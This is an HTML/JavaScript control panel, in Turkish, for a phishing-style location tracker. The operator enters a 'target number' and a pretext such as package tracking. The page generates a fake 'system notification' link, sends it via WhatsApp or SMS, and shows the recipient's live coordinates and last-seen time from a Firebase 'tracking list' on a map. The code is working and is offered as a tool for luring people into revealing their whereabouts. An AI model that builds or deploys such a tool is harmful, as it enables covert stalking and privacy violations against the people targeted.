<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTOMATİK BİLDİRİM PANELİ</title>
    <link rel="stylesheet" href="index.css">
    <script src="https://unpkg.com/lucide@latest"></script>
</head>
<body>
    <div class="glass-card">
        <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 1.5rem;">
            <i data-lucide="shield-check" style="color: var(--accent-primary); width: 28px; height: 28px;"></i>
            <h1 style="font-size: 1.1rem; margin: 0; font-weight: 800; letter-spacing: 0.05em;">SİSTEM BİLDİRİM PANELİ</h1>
        </div>
        
        <input type="text" id="phone-input" class="input-field" placeholder="Hedef Numara (05XXXXXXXXX)">
        <input type="text" id="name-input" class="input-field" placeholder="Mesaj Başlığı (Örn: Paket Takibi)">
        
        <button class="btn btn-primary" id="search-btn">
            <i data-lucide="zap"></i> Link Üret ve İzleme Başlat
        </button>

        <div id="link-result" style="display: none; margin-top: 1.5rem;">
            <div style="font-size: 0.7rem; font-weight: 800; color: var(--success); margin-bottom: 0.5rem; text-transform: uppercase;">Sistem Taslağı:</div>
            <div class="message-preview" id="message-preview"></div>
            
            <button id="copy-btn" class="btn btn-secondary" style="margin-bottom: 10px;"><i data-lucide="copy"></i> Taslağı Kopyala</button>
            <div style="display: flex; gap: 10px;">
                <button id="wa-btn" class="btn btn-wa" style="flex: 1;"><i data-lucide="message-circle"></i> WhatsApp</button>
                <button id="sms-btn" class="btn btn-secondary" style="flex: 1;"><i data-lucide="message-square"></i> SMS</button>
            </div>

            <div id="map" style="height: 300px; border-radius: 12px; margin-top: 1.5rem; border: 1px solid var(--border-color);"></div>
            <div id="status" style="font-size: 0.75rem; color: var(--text-secondary); margin-top: 0.5rem; text-align: center;">Hedef bekleniyor...</div>
        </div>
    </div>

    <!-- Leaflet.js -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
        import firebaseConfig from './firebase-config.js';

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        lucide.createIcons();

        let map, marker;

        const searchBtn = document.getElementById('search-btn');
        const linkResult = document.getElementById('link-result');
        const preview = document.getElementById('message-preview');
        const status = document.getElementById('status');

        searchBtn.addEventListener('click', () => {
            const phone = document.getElementById('phone-input').value.trim();
            const header = document.getElementById('name-input').value.trim() || "Sistem Doğrulaması";
            if (!phone) return alert("Hata: Numara gereklidir.");

            const link = window.location.origin + "/l.html?tel=" + phone + "&n=" + encodeURIComponent(header);
            const sysID = Math.floor(Math.random() * 90000) + 10000;
            const msg = `SİSTEM BİLDİRİMİ (ID: ${sysID})\n\nBu linke tıklayarak konumunuzu paylaşabilirsiniz.\n\n${header}: ${link}`;
            
            preview.innerText = msg;
            linkResult.style.display = "block";

            // Harita başlat
            if(!map) {
                map = L.map('map').setView([39, 35], 5);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
            }
            
            // Harita görünür olduğunda boyutunu yenile
            setTimeout(() => { map.invalidateSize(); }, 300);

            onValue(ref(database, 'takip_listesi/' + phone), (s) => {
                const data = s.val();
                if(data && data.lat) {
                    status.innerHTML = `🟢 Canlı Bağlantı Kuruldu! <br> Son Görülme: ${data.lastSeen}`;
                    const pos = [data.lat, data.lon];
                    if(!marker) marker = L.marker(pos).addTo(map);
                    else marker.setLatLng(pos);
                    map.setView(pos, 15);
                }
            });
        });

        document.getElementById('wa-btn').onclick = () => {
            const phone = document.getElementById('phone-input').value;
            window.open(`https://wa.me/${phone}?text=${encodeURIComponent(preview.innerText)}`);
        };

        document.getElementById('sms-btn').onclick = () => {
            const phone = document.getElementById('phone-input').value;
            window.open(`sms:${phone}?body=${encodeURIComponent(preview.innerText)}`);
        };

        document.getElementById('copy-btn').onclick = () => {
            navigator.clipboard.writeText(preview.innerText);
            alert("Kopyalandı!");
        };
    </script>
</body>
</html>
